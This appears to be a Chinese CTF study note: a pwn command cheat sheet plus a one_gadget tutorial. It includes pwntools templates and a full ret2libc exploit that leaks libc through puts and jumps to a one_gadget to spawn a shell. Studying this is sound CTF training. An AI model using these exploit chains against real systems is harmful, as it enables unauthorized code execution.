---
title: "one_gadget 与 Pwn 常用命令"
lastmod: 2026-04-16T16:45:40+08:00
draft: false
---
## 一、Pwn 常用命令速查

下面这些命令是做栈溢出、ret2libc、ROP、堆题时经常会用到的。建议先熟悉“信息收集 -> 调试 -> 找偏移 -> 找 gadget -> 写 exploit -> 远程打”的流程。

### 1. 基本信息

```bash
file ./pwn
checksec --file=./pwn
strings -a ./pwn | less
strings -a ./pwn | grep -E "sh|flag|cat|/bin"
readelf -h ./pwn
readelf -S ./pwn
readelf -s ./pwn | grep system
objdump -d -Mintel ./pwn | less
```

常见关注点：

- `Arch`：32 位还是 64 位。
- `Canary`：是否有栈保护。
- `NX`：栈是否不可执行。
- `PIE`：程序地址是否随机化。
- `RELRO`：GOT 是否可写。
- `Stripped`：符号是否被去掉。

### 2. 运行和交互

```bash
chmod +x ./pwn
./pwn
nc host port
socat - TCP:host:port
```

pwntools 里常用：

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

io = process("./pwn")
# io = remote("host", port)

io.sendline(b"AAAA")
io.recvuntil(b"name:")
io.sendlineafter(b"name:", b"AAAA")
io.interactive()
```

### 3. GDB 调试

```bash
gdb ./pwn
gdb -q ./pwn
```

常用 GDB 命令：

```gdb
run
r
break main
b *0x401234
continue
c
next
n
stepi
si
finish
info registers
i r
x/20gx $rsp
x/40wx $esp
x/s 0x404000
disassemble main
set disassembly-flavor intel
```

如果装了 `pwndbg`，常用：

```gdb
checksec
cyclic 200
cyclic -l 0x6161616b
vmmap
stack 30
ropper
got
plt
tel
```

### 4. 找溢出偏移

生成 cyclic：

```bash
cyclic 200
```

程序崩溃后看寄存器，例如 64 位看 `rip` 或栈上的返回地址，32 位看 `eip`：

```bash
cyclic -l 0x6161616b
```

pwntools 里：

```python
from pwn import *

payload = cyclic(200)
print(cyclic_find(0x6161616b))
```

常见手算：

- 缓冲区在 `[ebp-0x18]`，返回地址在 `ebp+4`，偏移就是 `0x18 + 4 = 28`。
- 64 位函数常见布局里，偏移通常是 `buf_size + saved_rbp(8)`。

### 5. 找 ROP gadget

```bash
ROPgadget --binary ./pwn
ROPgadget --binary ./pwn | grep "pop rdi"
ROPgadget --binary ./pwn | grep "pop rsi"
ROPgadget --binary ./pwn | grep "syscall"
ROPgadget --binary ./pwn --ropchain
```

也可以用 `ropper`：

```bash
ropper --file ./pwn
ropper --file ./pwn --search "pop rdi; ret"
ropper --file ./pwn --search "syscall"
```

64 位 ret2libc 常见 gadget：

```text
pop rdi; ret
pop rsi; ret
pop rdx; ret
ret
```

32 位 ret2syscall 常见 gadget：

```text
pop eax; ret
pop ebx; ret
pop ecx; ret
pop edx; ret
int 0x80
```

### 6. 查找 libc 信息

```bash
ldd ./pwn
pwninit
patchelf --print-interpreter ./pwn
patchelf --print-rpath ./pwn
```

找符号和字符串：

```bash
readelf -s libc.so.6 | grep system
readelf -s libc.so.6 | grep puts
strings -a libc.so.6 | grep "/bin/sh"
```

用 pwntools：

```python
libc = ELF("./libc.so.6")
system = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh"))
```

### 7. 常见 pwntools 模板

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("./pwn")
libc = ELF("./libc.so.6")

local = True

if local:
    io = process("./pwn")
else:
    io = remote("host", port)

def sla(delim, data):
    io.sendlineafter(delim, data)

def sa(delim, data):
    io.sendafter(delim, data)

def ru(delim):
    return io.recvuntil(delim)

def lg(name, value):
    log.success(f"{name}: {hex(value)}")

payload = b"A" * 40
io.sendline(payload)
io.interactive()
```

## 二、one_gadget 是什么

`one_gadget` 是一个 Ruby 工具，用来从 `libc.so.6` 里面寻找可以直接触发 `execve("/bin/sh", ...)` 的 gadget。

普通 ret2libc 经常写成：

```text
system("/bin/sh")
```

而 one_gadget 的思路是：

```text
返回到 libc 里的某个特殊地址
满足它的约束条件
直接执行 execve("/bin/sh", ...)
```

也就是说，利用时通常只需要：

```python
one_gadget_addr = libc_base + one_gadget_offset
```

然后把返回地址改成 `one_gadget_addr`。

## 三、Kali 上安装

本机 Kali 已经安装：

```bash
gem install --user-install one_gadget
```

当前版本：

```bash
one_gadget --version
```

结果：

```text
OneGadget Version 1.10.0
```

安装位置：

```text
/home/kali/.local/share/gem/ruby/3.3.0/bin/one_gadget
```

已经把这个路径写入：

```text
~/.zshrc
~/.bashrc
```

如果新终端里还是找不到命令，可以执行：

```bash
source ~/.zshrc
```

或者直接使用完整路径：

```bash
/home/kali/.local/share/gem/ruby/3.3.0/bin/one_gadget libc.so.6
```

## 四、基本用法

最常见用法：

```bash
one_gadget libc.so.6
```

示例输出大概长这样：

```text
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  [rsp+0x40] == NULL
```

意思是：

- `0x4f2a5` 是 one_gadget 在 libc 里的偏移。
- 真正跳转地址是 `libc_base + 0x4f2a5`。
- `execve("/bin/sh", rsp+0x40, environ)` 是它最终尝试执行的效果。
- `constraints` 是必须满足的条件。

利用时：

```python
one = libc_base + 0x4f2a5
payload = b"A" * offset + p64(one)
```

## 五、重要参数

### 1. 显示更多 gadget

```bash
one_gadget libc.so.6 --level 1
one_gadget libc.so.6 --level 2
```

`level` 越高，找出的 gadget 可能越多，但约束也可能更难满足。

### 2. 只输出偏移

```bash
one_gadget libc.so.6 --raw
```

输出可能是：

```text
0x4f29e 0x4f2a5 0x4f302 0x10a2fc
```

适合脚本里快速复制。

### 3. 查看帮助

```bash
one_gadget -h
```

## 六、使用流程

### 第一步：确定目标是动态链接

先看保护：

```bash
checksec --file=./pwn
ldd ./pwn
```

如果 `ldd ./pwn` 显示：

```text
not a dynamic executable
```

说明它是静态链接程序。这种情况一般不用 one_gadget，更适合 ret2syscall 或静态 ROP。

### 第二步：拿到 libc

常见来源：

- 题目附件给了 `libc.so.6`。
- 远程环境泄露后用 `libc-database` 查询。
- 本地用 `ldd ./pwn` 看程序加载的 libc。

查看：

```bash
ldd ./pwn
```

输出类似：

```text
libc.so.6 => ./libc.so.6
```

### 第三步：找 one_gadget 偏移

```bash
one_gadget ./libc.so.6
```

记下几个偏移，例如：

```text
0x4f29e
0x4f2a5
0x4f302
0x10a2fc
```

### 第四步：泄露 libc 地址

常见泄露方式是泄露 `puts` 的真实地址：

```python
payload = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"],
)
```

接收泄露：

```python
leak = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = leak - libc.symbols["puts"]
log.success(f"libc_base: {hex(libc_base)}")
```

### 第五步：计算 one_gadget 地址

```python
one = libc_base + 0x4f2a5
```

然后第二次溢出：

```python
payload = flat(
    b"A" * offset,
    one,
)

io.sendline(payload)
io.interactive()
```

## 七、完整 64 位 ret2libc + one_gadget 示例

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("./pwn")
libc = ELF("./libc.so.6")

io = process("./pwn")
# io = remote("host", port)

offset = 40
pop_rdi = 0x401233
ret = 0x40101a

# 第一次：泄露 puts
payload = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"],
)

io.sendlineafter(b"input:", payload)

puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = puts_addr - libc.symbols["puts"]

log.success(f"puts: {hex(puts_addr)}")
log.success(f"libc_base: {hex(libc_base)}")

# one_gadget ./libc.so.6 得到的偏移
one_gadget_offset = 0x4f2a5
one_gadget_addr = libc_base + one_gadget_offset

log.success(f"one_gadget: {hex(one_gadget_addr)}")

# 第二次：返回到 one_gadget
payload = flat(
    b"A" * offset,
    ret,
    one_gadget_addr,
)

io.sendlineafter(b"input:", payload)
io.interactive()
```

这里加一个单独的 `ret` 是为了解决 64 位下常见的栈对齐问题。

## 八、constraints 约束怎么看

one_gadget 最重要的不是偏移，而是约束。

例如：

```text
constraints:
  [rsp+0x40] == NULL
```

意思是跳到 gadget 的时候，栈上 `rsp+0x40` 这个位置必须是 0。

如果不满足，程序大概率崩溃。

常见约束：

```text
rsp & 0xf == 0
[rsp+0x40] == NULL
[rbp-0x70] == NULL
rax == NULL
rcx == NULL
```

含义：

- `rsp & 0xf == 0`：栈需要 16 字节对齐。
- `[rsp+0x40] == NULL`：栈上某个位置必须是 0。
- `[rbp-0x70] == NULL`：`rbp` 附近某个内存位置必须是 0。
- `rax == NULL`：`rax` 寄存器必须是 0。
- `rcx == NULL`：`rcx` 寄存器必须是 0。

## 九、怎么满足约束

### 1. 栈对齐

64 位程序里如果 one_gadget 崩了，可以在前面加一个 `ret`：

```python
payload = flat(
    b"A" * offset,
    ret,
    one_gadget_addr,
)
```

### 2. 让栈上出现 NULL

如果约束是：

```text
[rsp+0x40] == NULL
```

可以在 payload 后面补一些 `p64(0)`：

```python
payload = flat(
    b"A" * offset,
    ret,
    one_gadget_addr,
    p64(0) * 20,
)
```

### 3. 换另一个 one_gadget

最实用的方法通常是：把输出的几个 one_gadget 都试一遍。

```python
gadgets = [0x4f29e, 0x4f2a5, 0x4f302, 0x10a2fc]

for off in gadgets:
    one = libc_base + off
    print(hex(one))
```

实战时可以手动换，也可以写循环批量测试。

### 4. 用 ROP 设置寄存器

如果约束要求某个寄存器为 0，可以找 gadget 设置：

```text
pop rax; ret
pop rcx; ret
xor eax, eax; ret
```

不过这不一定总能找到。能找到时可以这样：

```python
payload = flat(
    b"A" * offset,
    pop_rax,
    0,
    one_gadget_addr,
)
```

## 十、one_gadget 适合什么题

适合：

- 动态链接 ELF。
- 能泄露 libc 地址。
- 能控制返回地址。
- one_gadget 的约束可以满足。
- ret2libc 的常规链不好写，或者想快速尝试 getshell。

不适合：

- 静态链接程序。
- libc 地址泄露不了。
- 只能控制很短的 payload。
- 程序状态无法满足 constraints。
- 题目更适合 ret2syscall、SROP、ORW、堆利用。

比如当前的 pwn73 是 32 位静态链接程序，就更适合：

```text
read(0, bss, 8)
execve(bss, 0, 0)
```

也就是 ret2syscall，不需要 one_gadget。

## 十一、one_gadget 和 system("/bin/sh") 的区别

### system("/bin/sh")

优点：

- 思路稳定。
- 约束少。
- 容易调试。

常见 payload：

```python
payload = flat(
    b"A" * offset,
    pop_rdi,
    bin_sh,
    system,
)
```

缺点：

- 需要 `/bin/sh` 字符串地址。
- 需要控制参数寄存器，比如 64 位要控制 `rdi`。

### one_gadget

优点：

- payload 可能很短。
- 有时只要覆盖返回地址就能 getshell。

缺点：

- 依赖 constraints。
- 换 libc 以后偏移会变。
- 崩溃原因有时不直观。

## 十二、实战排错

### 1. one_gadget 地址算错

确认 libc base：

```python
libc_base = leak - libc.symbols["puts"]
```

确认 gadget：

```python
one = libc_base + 0x4f2a5
```

不要把 `one_gadget` 输出的偏移当成绝对地址。

### 2. libc 版本不匹配

远程和本地 libc 不一致时，one_gadget 偏移也会不一致。

解决：

```bash
pwninit
ldd ./pwn
```

或者用泄露出的符号地址查 libc。

### 3. 栈没对齐

64 位下经常加一个 `ret`：

```python
payload = b"A" * offset + p64(ret) + p64(one)
```

### 4. constraints 不满足

换 gadget，或者补 NULL：

```python
payload = flat(
    b"A" * offset,
    ret,
    one,
    p64(0) * 20,
)
```

### 5. 输入函数截断

如果用的是 `gets`、`read`，payload 中可以有 `\x00`。

如果用的是 `scanf("%s")`、`strcpy` 一类字符串函数，`\x00`、空格、换行可能会导致截断。

## 十三、常用组合命令

```bash
checksec --file=./pwn
file ./pwn
ldd ./pwn
ROPgadget --binary ./pwn | grep "pop rdi"
strings -a libc.so.6 | grep "/bin/sh"
readelf -s libc.so.6 | grep " system@@"
one_gadget libc.so.6
```

如果是 32 位静态程序：

```bash
ROPgadget --binary ./pwn | grep "pop eax"
ROPgadget --binary ./pwn | grep "pop ebx"
ROPgadget --binary ./pwn | grep "pop ecx"
ROPgadget --binary ./pwn | grep "pop edx"
ROPgadget --binary ./pwn | grep "int 0x80"
readelf -S ./pwn | grep -E ".bss|.data"
```

如果是 64 位 ret2libc：

```bash
ROPgadget --binary ./pwn | grep "pop rdi"
ROPgadget --binary ./pwn | grep "ret"
one_gadget ./libc.so.6
```

## 十四、记忆口诀

```text
先 checksec，看保护。
再 file，看位数。
找偏移，找 gadget。
能泄露，算 libc。
常规先试 system("/bin/sh")。
想省事再试 one_gadget。
one_gadget 不看 constraints，基本等于碰运气。
静态程序别硬上 one_gadget，ret2syscall 往往更香。
```

